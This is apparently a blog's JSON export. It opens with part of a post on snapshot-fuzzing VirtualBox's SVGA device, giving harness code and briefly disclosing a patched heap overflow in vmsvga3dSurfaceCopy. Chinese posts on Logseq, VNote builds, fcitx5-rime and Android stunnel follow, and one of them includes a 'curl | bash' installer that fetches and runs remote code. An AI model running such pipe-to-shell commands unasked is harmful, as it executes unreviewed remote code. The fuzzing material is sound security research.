vmsvgaR3FifoGetCmdPayload to receive command data from guest to host. I define a breakpoint handler in Init() callback function as below. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(// unsigned int cbPayloadReq,// volatile unsigned int *pFIFO,// unsigned int offCurrentCmd,// unsigned int offFifoMin,// unsigned int offFifoMax,// unsigned __int8 *pbBounceBuf,// unsigned int *pcbAlreadyRead,// PDMTHREAD *pThread,// VGAState *pThis,// VMSVGAR3STATE *pSVGAState,// PDMDEVINSR3 *pDevIns)//if(!g_Backend-&gt;Setbreakpoint(&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;, [](Backend_t *Backend) { uint32_t cbPayloadReq = Backend-&gt;GetArg(0); Gva_t pbBounceBuf_gva = Backend-&gt;GetArgGva(5); Gva_t pcbAlreadyRead_gva = Backend-&gt;GetArgGva(6); if(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) { DebugPrint(&quot;cbpayloadReq({:#x}) &gt; SvgaCmdBodySize({:#x}), restore context and goto next round\\n&quot;, cbPayloadReq, GlobalState.SvgaCmdBodySize); return GlobalState.RestoreGprs(Backend); } if(cbPayloadReq &gt; u32PbBounceBufMaxSize) { const uint64_t RetAddr = Backend-&gt;VirtRead8(Gva_t(Backend-&gt;Rsp())); DebugPrint(&quot;check this, RetAddr = {:#x}\\n&quot;, RetAddr); std::abort(); } if(!Backend-&gt;VirtWriteDirty(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) { fmt::print(&quot;Failed to write pbBounceBuf, pbBounceBuf = {:#x}, cbPayloadReq = {:#x}, SvgaCmdBodySize = {:#x}\\n&quot;, pbBounceBuf_gva.U64(), cbPayloadReq, GlobalState.SvgaCmdBodySize); std::abort(); } if(!Backend-&gt;VirtWriteStructDirty(pcbAlreadyRead_gva, &amp;cbPayloadReq)) { fmt::print(&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = {:#x}\\n&quot;, pcbAlreadyRead_gva.U64()); std::abort(); } Backend-&gt;SimulateReturnFromFunction(pbBounceBuf_gva.U64());})) { fmt::print(&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\\n&quot;); return false;} I also had to define end point of execution. After some reversing, I found two spots and using it as end point. 1234567891011121314151617const Gva_t SvgaLoopEnd = Gva_t(g_Dbg.GetSymbol(&quot;VBoxDD!vmsvgaR3FifoLoop&quot;) + 0x24AB);if(!g_Backend-&gt;Setbreakpoint(SvgaLoopEnd, [](Backend_t *Backend) { DebugPrint(&quot;loop end reached, restore context\\n&quot;); GlobalState.RestoreGprs(g_Backend);})) { fmt::print(&quot;Failed to Setbreakpoint on SvgaLoopEnd\\n&quot;); return false;}const Gva_t SvgLoopEnd2 = Gva_t(g_Dbg.GetSymbol(&quot;VBoxDD!vmsvgaR3FifoLoop&quot;) + 0x24B2);if(!g_Backend-&gt;Setbreakpoint(SvgLoopEnd2, [](Backend_t *Backend) { DebugPrint(&quot;loop end2 reached, restore context\\n&quot;); GlobalState.RestoreGprs(g_Backend);})) { fmt::print(&quot;Failed to Setbreakpoint on SvgLoopEnd2\\n&quot;); return false;} As I said above, I create a snapshot on vmsvgaR3FifoLoop+4E2. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const Gva_t SvgaLoopStart = Gva_t(g_Dbg.GetSymbol(&quot;VBoxDD!vmsvgaR3FifoLoop&quot;) + 0x4e2);if(!g_Backend-&gt;Setbreakpoint(SvgaLoopStart, [](Backend_t *Backend) { if(GlobalState.SvgaCmds.size() == 0) { DebugPrint(&quot;testcase deque empty! goto next round...\\n&quot;); return Backend-&gt;Stop(Ok_t()); } auto &amp;Testcase = GlobalState.SvgaCmds.front(); while (Testcase.SvgaCmdCode == 1045) { GlobalState.SvgaCmds.pop_front(); if(GlobalState.SvgaCmds.size() == 0) { DebugPrint(&quot;testcase deque empty during cmd filtering! goto next round...\\n&quot;); return Backend-&gt;Stop(Ok_t()); } Testcase = GlobalState.SvgaCmds.front(); } Backend-&gt;Rbx(Testcase.SvgaCmdCode); DebugPrint(&quot;SvgaCmdCode = {:#x}\\n&quot;, Testcase.SvgaCmdCode); if(Testcase.SvgaCmdCode &gt;= 1040) { DebugPrint(&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write {:#x} on first DWORD\\n&quot;, Testcase.SvgaBody.size()); const uint32_t Svga3dCmdSize = Testcase.SvgaBody.size(); if(Svga3dCmdSize &gt;= 0x200000) { fmt::print(&quot;Svga3dCmdSize({:#x}) &gt; cbFIFO, abort\\n&quot;, Svga3dCmdSize); std::abort(); } memcpy(&amp;GlobalState.SvgaCmdBody[0], &amp;Svga3dCmdSize, 4); memcpy(&amp;GlobalState.SvgaCmdBody[4], Testcase.SvgaBody.data(), Testcase.SvgaBody.size()); GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.size() + 4; } else { memcpy(GlobalState.SvgaCmdBody, Testcase.SvgaBody.data(), Testcase.SvgaBody.size()); GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.size(); } GlobalState.SvgaCmds.pop_front();})) { fmt::print(&quot;Failed to Setbreakpoint on SvgaLoopStart\\n&quot;); return false;} After some investigation, I found CreateDeviceEx call in vmsvga3dContextDefine keep causing CR3 context switching and I didn’t found any way to handling it using breakpoint handler. So I just blacklisting it( SVGA_3D_CMD_CONTEXT_DEFINE = 1045 ). I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly. 123456789101112131415161718192021222324252627282930313233343536explicit CustomMutator_t(std::mt19937_64 &amp;Rng, const size_t TestcaseMaxSize) : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) { // set maximum size for multiple (mutated) testcase( Default = 1MB ) ScratchBuffer__ = std::make_unique&lt;uint8_t[]&gt;(_1MB); ScratchBuffer_ = {ScratchBuffer__.get(), _1MB}; BodyMutator_ = make_unique&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);}// skip for brevity...std::string Mutate(uint8_t *Data, const size_t DataLen, const size_t MaxSize) { auto Root = Deserialize(Data, DataLen); auto &amp;SvgaCmds = Root.SvgaCmds; for(auto &amp;SvgaCmd : SvgaCmds) { // // 50% // if(GetUint32(0, 1) == 1) { uint32_t SvgaCmdRandomIdx = GetUint32(0, SvgaCmdListLen); SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx]; } memcpy(GlobalMutBuffer, SvgaCmd.SvgaBody.data(), SvgaCmd.SvgaBody.size()); size_t NewTestcaseSize = BodyMutator_-&gt;Mut_.Mutate(GlobalMutBuffer, SvgaCmd.SvgaBody.size(), MaxSize); SvgaCmd.SvgaBody.resize(NewTestcaseSize); memcpy(SvgaCmd.SvgaBody.data(), GlobalMutBuffer, NewTestcaseSize); } json::json Serialized; to_json(Serialized, Root); return Serialized.dump();} I also define generator function. It is very useful if you are too lazy to create random input like me ^~^. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556std::string GenerateTestcase() { SvgaCmds_t Root; const auto N = GetUint32(1, 10); for (size_t Idx = 0; Idx &lt; N; Idx++) { SvgaCmd_t SvgaCmd; SvgaCmd.SvgaCmdCode = SvgaCmdList[GetUint32(0, SvgaCmdListLen)]; SvgaCmd.SvgaBody.resize(GetUint32(0x100, 0x400)); if(GetUint32(0, 1) == 0) { for(int i = 0; i &lt; SvgaCmd.SvgaBody.size(); i++) { SvgaCmd.SvgaBody[i] = 0x41; } } else { for(int i = 0; i &lt; SvgaCmd.SvgaBody.size(); i++) { SvgaCmd.SvgaBody[i] = (uint8_t)GetUint32(0, 255); } } Root.SvgaCmds.emplace_back(SvgaCmd); } json::json Serialized; to_json(Serialized, Root); return Serialized.dump();}std::string GetNewTestcase(const Corpus_t &amp;Corpus) override { // // 20% // if(GetUint32(1, 5) == 1) { return GenerateTestcase(); } const Testcase_t *Testcase = Corpus.PickTestcase(); if (!Testcase) { fmt::print(&quot;The corpus is empty, generate random one\\n&quot;); return GenerateTestcase(); } // // Copy the input in a buffer we're going to mutate. // memcpy(ScratchBuffer_.data(), Testcase-&gt;Buffer_.get(), Testcase-&gt;BufferSize_); // return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_); return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - sizeof(uint32_t));} Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module. …..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of Init() function. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475bool SetupVBoxBlacklistHooks() { if(!g_Backend-&gt;SetBreakpoint(&quot;VBoxRT!RTLogLoggerEx&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;VBoxVMM!PDMCritSectLeave&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;VBoxC!util::AutoLockBase::release&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;VBoxC!util::AutoLockBase::acquire&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;VBoxRT!SUPSemEventWaitNoResume&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\\n&quot;); std::abort(); } if(!g_Backend-&gt;SetBreakpoint(&quot;d3d9!CBaseDevice::Release&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\\n&quot;); } if(!g_Backend-&gt;SetBreakpoint(&quot;d3d9!CD3DBase::Clear&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\\n&quot;); } if(!g_Backend-&gt;SetBreakpoint(&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\\n&quot;); } if(!g_Backend-&gt;SetBreakpoint(&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0); })) { fmt::print(&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\\n&quot;); } if(!g_Backend-&gt;SetBreakpoint(&quot;USER32!GetDC&quot;, [](Backend_t *Backend) { Backend-&gt;SimulateReturnFromFunction(0x1337); })) { fmt::print(&quot;Failed to SetBreakpoint on USER32!GetDC\\n&quot;); } return true;} Yep. That’s really everything. I use this fuzz module several hours and it founds interesting crash. 3. Vulnerability( TL;DR )Crash occurred in vmsvga3dSurfaceCopy function( PageHeap needed ). This function trying to copy surface data from one to another using surface id and there’s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory. This vulnerability patched in 6.1.36 release at July, 2022. 4. ConclusionI think importance of snapshot fuzzing is, it makes researcher to focus on target itself. Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.","link":"/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/"},{"title":"Logseq 使用小结 （二）","text":"用了 Logseq 一段时间了，做个简单的总结，国内的很多文章，在我看来还是不够简单明了, 本文大致介绍了 Logseq 比较常用的一些功能的使用。 Flashcards可以把记录的知识点当作卡片来记忆，用过 Anki 的同学，应该都比较熟悉了，使用的记忆算法为 SM-5要将一个 block 记为卡片非常简单，使用 #card 标签就可以了。 卡片组有些卡片可能是归属同一个大类，这时候就可以使用卡片组了。像我上面这个例子中，要记忆的单词都在 英语单词积累下，就可以使用语法 {{cards 英语单词积累}} 效果如下图，可以看出我已经积累了7张卡片了。 要背诵需要记忆的卡片时，单击左侧的 Flashcards 就可以了，使用方面没有什么特别的地方，有三个选项可以选择。 theme （皮肤）皮肤就是青菜萝卜各有所爱了，推荐两款我自己比较喜欢的的皮肤。 Github 仓库地址如下： https://github.com/pengx17/logseq-laurel-themehttps://github.com/tobealive/logseq-allday-theme 有两种方法可以设置皮肤： custom.css plugin system 使用 custom.css，打开 Settings -&gt; General -&gt; Custom theme 点击 custom.css 复制 css 内容，保存退出即可。使用插件系统，则需要先把插件系统打开，Settings -&gt; Advanced -&gt; Plug-in system 。打开插件系统后，可以直接使用Plugins -&gt; Marketplace -&gt; themes 选择你喜欢的 theme 点击 Install 就可以了 不过还是推荐使用 Logseq 自带的插件管理系统来安装，可以自动升级比较方便，切换皮肤可以点击右上角 三个点 -&gt; Themes 选择皮肤。 plugin （插件）使用 Logseq 插件同样是两种方法： plugin system Load unpacked plugin 使用插件系统的方法和上面安装皮肤的步骤大致相同，依次点击 Plugins -&gt; Marketplace -&gt; Plugins ，选择插件点击 Install 即可。要加载 unpacked plugin 首先要打开开发者模式 Settings -&gt; Advanced -&gt; Developer mode , 设置为打开。打开后使用插件管理系统 Plugins -&gt; Installed -&gt; Load unpacked plugin 选择相关目录就可以了。 具体的插件可以参考 https://github.com/logseq/awesome-logseq#Plugins 记录的插件都挺不错的。 值得一提的是，插件系统的网络不太稳定（总所周知的原因），使用代理会方便一些。 1https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128 安装插件可能会出现 timeout 错误，多重试几次就应该可以安装上了。 queryquery 算是 Logseq 的高级功能了，我用的也不多，输入 /query 回车就可以自动进入 query 了，具体的语法很灵活可以参考：https://logseq.github.io/#/page/queries 油管上有相关 video，大家可以参考一下：https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMindhttps://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind 写在后面的话Logseq 的功能还是挺多的，两篇文章也不可能全部介绍完，官方文档总是最好的资料：https://logseq.github.io/#/page/Contents 参考资料https://logseq.github.io https://www.usmacd.com/cn/logseq/https://www.usmacd.com/cn/logseq3/","link":"/cn/logseq2/"},{"title":"logseq 试用报告","text":"最近双链笔记的概念比较火热， Roam Research 大概是第一个实现此功能的软件，后续 Notion、Obsidian、logseq 等软件大步跟进，这些软件各有千秋。下面这段是参考资料文章中的一小段，很有参考意义： 12345Roam 的突破在于，理论上，把软件设计理念与卡片盒笔记法紧紧捆绑：卢曼（Niklas Luhmann）得益于卡片盒笔记法，从公务员成为德国当代重要的社会学家，因此基于卡片盒笔记法的 Roam 也可以助力你的成功；技术上，推出双向链接、可视化笔记间的联系、嵌入（Transclusion）等功能，让生产、查找笔记更加高效，于此同时，还省却维护层级结构的麻烦。 上面两张图片就是卡片盒笔记法 最形象的表示了，个人觉得这种方法很适合自己。 为了体验双链笔记，我花费了不少时间，上面的几个软件都体验了一下，Roam 是收费软件，银子不够所以不选，Notion 笔记存储在云端，不符合我数据安全的要求也不选，剩下的就只有两个选项了 Obsidian 和 logseq 。 Obsidian软件主页：https://obsidian.md/ 挺多人选择用 Obsidian 的原因是它的 MarkDown 语法支持得比较好，MarkDown 语法有很多的使用者，类似 Typora 的 MarkDown 笔记软件是当前笔记软件的主流，这使得这些笔记软件的使用者过渡到 obsidian 会比较平滑。我是开源MarkDown 笔记软件 Vnote 的重度使用者，一度想使用 Obsidian 作为主力软件。 Obsidian 有挺多优点，比如它对个人用户永久免费，但是它不开源，而且 Link+to+blocks 的语法比较别扭。最终还是没有选择它，有人说Obsidian 插件非常丰富，我自己没有折腾过。 logseq软件主页：https://logseq.com/源码仓库：https://github.com/logseq/logseq 说了这么久终于到正主了，第一次知道双链笔记这个概念是因为有个网友在网上说使用效果不错，过渡很平滑。可能有先入为主的关系，另外我本人对开源软件一向有莫名的好感，所以主观意识上就很喜欢这个软件。logseq 的粒度足够，block reference 使用非常方便，另外 logseq 的 PDF 标记功能对于需要大量阅读论文的我来说非常好用。 但是 logseq 也不是没有缺点，logseq 对 markdown 语法的支持不是很好，即使直接导入 MarkDown 文件，最后显示的结果感觉也是有问题，各类标题直接转化成 block 了，这是有问题的。但是从这个角度说 logseq 就是一个纯粹的双链笔记软件而不是一个添加了双链功能的 MarkDown 笔记软件。 最终的笔记管理方法说到这，问题就简化了，平时的文档记录仍然使用 MarkDown 笔记软件，只是在平时记录的时候使用双链笔记软件。这样的笔记管理方法看上去比较麻烦，其实却很完美，想写文章的时候直接用 VNote，平时知识积累记录的时候就用 logseq，根本就不用过渡，只需要启用一个新软件即可。 基于 block 的双链笔记最大的好处就是没有输出负担，一些很随意的想法都可以记录下来，因为大家确实不可能每次都有大段的想法可以输出。有人说用 logseq一年写了 30万字，我开始觉得有点夸张，但是使用一个多月发现可能属实，现在我自己都写了几万字了。每个想法 (block) 之间可能会有联系，不断记录想法，不断联系，慢慢的真能发现一些意想不到的东西之间居然有联系，而这些联系很有可能是一些关键的底层逻辑。平时在记录的时候手工划分目录，层次关系，其实已经将一些想法，概念给逻辑化了，这样的记录方法很难摆脱固有的认知，而基于 block 的双链笔记就自由的多，不断记录，不断整理，汇总就交给软件来完成吧。 我现在已经通过 logseq 的记录想清楚了一些问题，在平时的工作记录中也不断地稳步螺旋推进，在此向大家推荐这款笔记软件。 最后的话其实工具并不是那么重要，最重要的还是平时要记录，要定期输出。IT 界有一个著名的段子，你以为你是在写 blog 其实你只是在折腾 wordpress ：） 共勉。 参考资料双链笔记软件推荐：Logseq 和它的五种用法请不要神化双链笔记 https://www.usmacd.com/cn/logseq2/https://www.usmacd.com/cn/logseq3/","link":"/cn/logseq/"},{"title":"Markdown 笔记软件： VNote","text":"向大家安利一款 markdown 笔记软件， VNote https://github.com/vnotex/vnote此软件目前已经 1300 多个commits 了，做为一个有些开源软件维护经历的人，深感不易。用了太多 markdown 笔记软件，此软件使得最为顺手，尤其作为程序员 vim 模式 让我感到非常舒服，大量图表的支持比如 UML 流程图，让我用起来很顺手。 Vnote 分为两个开发阶段，阶段一 vnote2 已经开发完成：https://github.com/vnotex/vnote/tree/vnote2现在处于第二个开发阶段：https://github.com/vnotex/vnote 据说后续会出收费版本，但目前看还需要很长的一段时间了。 我前后尝试过各种笔记软件，我理想的软件有几点： a. 支持文件管理 b. 不要乱改数据，容易迁移 c. 支持 markdown d. 跨平台，支持 Mac 和 Linux 最后，终于发现了 VNote，有点惊喜。在 Linux 下编译 VNote 显示有明显改进，下面是编译的方法： 下载 QT SDK （最新的 vnotex 官方支持 Qt 5.15.2，可自行下载使用替换相应的版本即可） https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run 将 Qt5.9 安装到 /home/henices/Qt5.9.0/ 编译 fcitx-qt5 （如果使用的是 fcitx5，需要下载编译 fcitx5-qt） git clone https://gitlab.com/fcitx/fcitx-qt5.git 准备编译脚本 build_linux.sh， 指定下载的QT 12345678910QTDIR=&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;PATH=&quot;$QTDIR/bin:$PATH&quot;LDFLAGS=-L$QTDIR/libCPPFLAGS=-I$QTDIR/includerm -rf buildmkdir -p buildcd buildcmake ..make -j8 使用下面命令编译 12chmod a+x ./build_linux.sh./build_linux.sh 将生成的 libfcitxplatforminputcontextplugin.so copy 到/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/ 获取VNote 源码 123git clone https://github.com/tamlok/vnote.git vnote.gitcd vnote.gitgit submodule update --init 编译 build_linux.sh 1234567891011QTDIR=&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;PATH=&quot;$QTDIR/bin:$PATH&quot;LDFLAGS=-L$QTDIR/libCPPFLAGS=-I$QTDIR/includerm -rf buildmkdir -p buildcd buildqmake -vqmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.promake -j8 使用下面命令编译 12chmod a+x ./build_linux.sh./build_linux.sh 安装 sudo make install 诡异问题Fedora 升级到 35 后，Vnote 出现了一系列问题 vnote 的阅读模式不能正常显示 （Qt 5.12.11） 解决这个问题需要禁用 Qtwebengine 的 sandbox 1./vnote --no-sandbox 导出 pdf 文件 cpu 100% （Fedora 系统自带 Qt 5.15.2 编译） 官方提供的 Linux AppImage 文件无法打开 Fcitx5 输入法。 最终解决问题的方法是下载 Qt5.15.2 重新编译 Vnote， Qt 从 5.15 开始不提供离线安装包，非常不方便。官方提供的在线升级包如果太新只能安装 Qt 6，所以必须下载老版本的 online installerhttps://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run 具体内容可以参考 https://github.com/vnotex/vnote/issues/1942 的讨论 2022.8.2 更新 导出 pdf 文件 cpu 100% 的问题，我调试 Qt 5.15.5 代码时已经解决，可以参考：https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b Qt 5.15.3使用 Qt 5.15.3 编译 VNOte 后，出现下面的报错 1[695784:695784:0401/181224.580254:ERROR:network_service_instance_impl.cc(286)] Network service crashed, restarting service. bug 在这 https://bugreports.qt.io/browse/QTBUG-91715 可以先使用环境变量救急一下 1QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=--lang=de ./vnote --no-sandbox --disable-gpu 2022.8.2 更新 Qt 5.15.5 已经修复了这个问题。 参考链接https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md","link":"/cn/vnote/"},{"title":"fedora 上安装 fcitx5 rime","text":"现在 fcitx 已经升级到了 fcitx5, 本来用着 fcitx4 挺好，也没有想着升级，在折腾 fcitx.vim 的时候发现 fcitx 居然升级了，使得我的 vim 插件无法正常工作了，一顿折腾，本来以为很简单没想到进了个大坑 。主要是不愿意放弃我的一万多行的 rime 用户词库，多年的积累了，不过 Linux 用户不就是老折腾吗， 唉。 fcitx5-rime 的默认的配置目录已经变为 ~/.local/share/fcitx5/rime， fcitx4 默认的配置目录是 ~/.config/fcitx/rime 安装 fcitx5 和 fcitx5 rime12sudo dnf install -y fcitx5 fcitx5-autostart fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qtsudo dnf install -y fcitx5-rime Fedora dnf 已经默认有 fcitx5-rime 的安装包了，不用自己重新编译了，非常不错。 fcitx5-chinese-addons 为 fcitx5 自己默认带的中文输入法，这些和 rime 没有什么关系，网络上有人说， fcitx 的中文输入较以前有较大改进。fcitx5-autostart 用于自启动。后面发现系统自带的启动环境变量好像设置的有问题，不安装其实也没有什么问题，自己手动执行 fcitx5 -d 即可。 设置正确的环境变量修改 ~/.xprofile， ~/.zshrc ， /etc/profile 等文件 123export GTK_IM_MODULE=fcitx5export QT_IM_MODULE=fcitx5export XMODIFIERS=&quot;@im=fcitx5&quot; 编译 fcitx5-qt5为了使我们自己编译的 vnote 可以正常使用 fcitx5， 需要编译 fcitx5-qt，新版的代码需要安装依赖 qt5-qtbase-private-devel 要不会出现 Parse error at “IID” 的错误。 sudo dnf install qt5-qtbase-private-devel.x86_64 12345678910111213141516git clone git@github.com:fcitx/fcitx5-qt.gitcat &lt;&lt; EOF &gt; build_linux.shQTDIR=&quot;/home/henices/Qt5.12.9/5.12.9/gcc_64/&quot;PATH=&quot;$QTDIR/bin:$PATH&quot;LDFLAGS=-L$QTDIR/libCPPFLAGS=-I$QTDIR/includerm -rf buildmkdir -p buildcd buildcmake ..make -j8EOFbash build_linux.sh 编译完成后将生成的 so 文件 copy 到 qt 的插件目录： 12cd buildcp ./qt5/platforminputcontext/libfcitx5platforminputcontextplugin.so /home/henices/Qt5.12.9/5.12.9/gcc_64/plugins/platforminputcontexts/ 配置中文环境1234sudo vim /etc/locale.confexport LANG=&quot;zh_CN.UTF-8&quot;export LC_CTYPE=&quot;zh_CN.UTF-8&quot; 安装 rime 词库rime 现在已经使用 plum 管理词库，如果需要安装双拼输入法的，可以执行下面的命令： 12curl -fsSL https://git.io/rime-install | bashrime_frontend=fcitx5-rime bash rime-install double_pinyin rime 为了保证输入速度，词库很小，为了能够自动显示更多的词组，就需要使用拓展词库。 12git clone https://github.com/rime-aca/dictionaries.gitcp dictionaries/luna_pinyin.dict/* ~/.local/share/fcitx5/rime/ 安装了上面的拓展词库后，输入特殊符号的能力还是比较弱，需要把 symbols.yaml 也给加进来。 https://github.com/rime/rime-prelude 提供了我们所需要的 symbols.yaml 和 default.yaml,可以使用 東風破 安裝： rime_frontend=fcitx5-rime bash rime-install prelude 由于我们使用的是自然码双拼，需要修改的文件为 double_pinyin.custom.yaml 12345patch: # 載入朙月拼音擴充詞庫 &quot;translator/dictionary&quot;: luna_pinyin.extended &quot;punctuator/import_preset&quot;: symbols &quot;recognizer/patterns/punct&quot;: &quot;^/([A-Z|a-z]*|[0-9]|10)$&quot; 设置完成后，要重新启动输入法，比如要输入 ☆ ，输入 /xh 即可 将用户词库导入 rimerime_dict_manager -i luna_pinyin luna_pinyin.userdb.txt 这一步很关键啊，多年的积累不能浪费了。 配置 fcitx5 皮肤fcitx5 默认的皮肤不太好看，所以下载更新了皮肤，这款简约风格的皮肤非常符合老夫的胃口。 12git clone https://github.com/thep0y/fcitx5-themes.gitcp spring ~/.local/share/fcitx5/themes -r 修改配置文件 ~/.config/fcitx5/conf/classicui.conf 1234567891011# 垂直候选列表Vertical Candidate List=False# 按屏幕 DPI 使用PerScreenDPI=True# Font (设置成你喜欢的字体)Font=&quot;Smartisan Compact CNS 13&quot;# 主题(这里要改成你想要使用的主题名，主题名就在下面)Theme=spring 另外还有一款 fcitx5 皮肤相对流行：https://github.com/hosxy/Fcitx5-Material-Color 切换皮肤的方法是，点击鼠标右键点击 配置 -&gt; 附加组件 -&gt; 经典用户界面 -&gt; 点击右边图标 -&gt; 选择皮肤 设置 fcitx rime 单行模式如果要将输入法设置为单行模式，需要修改配置文件 ~/.config/fcitx5/conf/rime.conf 1PreeditInApplication=True 或者按快捷键 ctrl + alt + p, 这个快捷键可以来回切换很方便，单行还是双行就因人而异了，我个人觉得单行好点。 让 fcitx5 正确显示菜单要做这个步骤是因为 rime 有 「部署」、「同步」这几个操作按钮，如果不正确配置的话在 fcitx5 上没法正常显示。fcitx5 在任务上有个托盘图标，点击右键就可以看到这些菜单。 要让 fcitx 正确显示菜单，关键在于让 rime 输入法默认处于激活状态，根据 fcitx5 配置的提示第一个输入法为非激活状态。 （1） 将第一个输入法设置为 键盘-英语 （美国），第二个输入法设置为 中州韵 （2） 在全局设置中，勾上默认状态为激活，共享输入状态设置为 程序 fcitx.vim这个章节是写给 linux vim 用户看的，没有此需求的可以直接跳过这段。 vim 确实是程序编辑的利器，但是在用vim 写中文文档的时候，有一个痛点，你在用 fcitx 写中文的时候想保存文档，vim 必须切换到 normal 模式才能输入保存的命令 :w，进入normal 模式的方法是连续按两下 ESC，好了现在你应该输入命令了，但是你没法输入你现在还在打中文呢，没有办法你必须先切换到英文输入法，然后才能正确地输入 :w 痛苦啊。 fcitx.vim 就是为解决这个痛点而生的插件，个人觉得这是vim 必装的几个插件之一。fcitx.vim 的github 仓库地址为：https://github.com/lilydjwg/fcitx.vim 值得一提的是这个仓库有两个分支，fcitx4 分支 和 fcitx5 分支，使用的时候一定要分清楚，这两个分支如果使用错了，就没法正常使用 fcitx.vim 插件了。fcitx4 和 fcitx5 dbus 对象名字有变化，导致代码通用性不好。现在默认分支为 fcitx5，如果你使用 fcitx4 可能直接 git clone 下来就会发现插件用不了，我也是因为这个原因才发现 fcitx 居然更新了。 后记可能有些人不知道为什么要折腾 rime，rime 的用户词库文件是个宝贝，这个词库是都是你真实的在日常使用中用到的词库，小巧又实用还能到处同步，上传到云后永不丢失，符合自己的数据自己掌握的硬道理。至于国内的那些输入法，我就不加以评价了，在这商业的社会要保持基本的做人底线不易。 参考资料 https://xuthus.cc/misc/fedora-install-fcitx5.html","link":"/cn/fcitx5-rime/"},{"title":"在 Android 手机上的使用 stunnel  （不需要 root ）","text":"☆ Android stunnelhttps://github.com/comp500/SSLSocks.git 这个项目可以使用 android 版本的 stunnel, 其实就是调用 https://www.stunnel.org/downloads/stunnel-5.57-android.zip 具体配置和使用命令行差距不大，参考：https://github.com/comp500/SSLSocks/blob/master/README.mdhttps://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/ ☆ 设置全局代理 在 wifi 连接的情况 打开wifi 列表 -&gt; 长按连接的 wifi -&gt; 点击修改 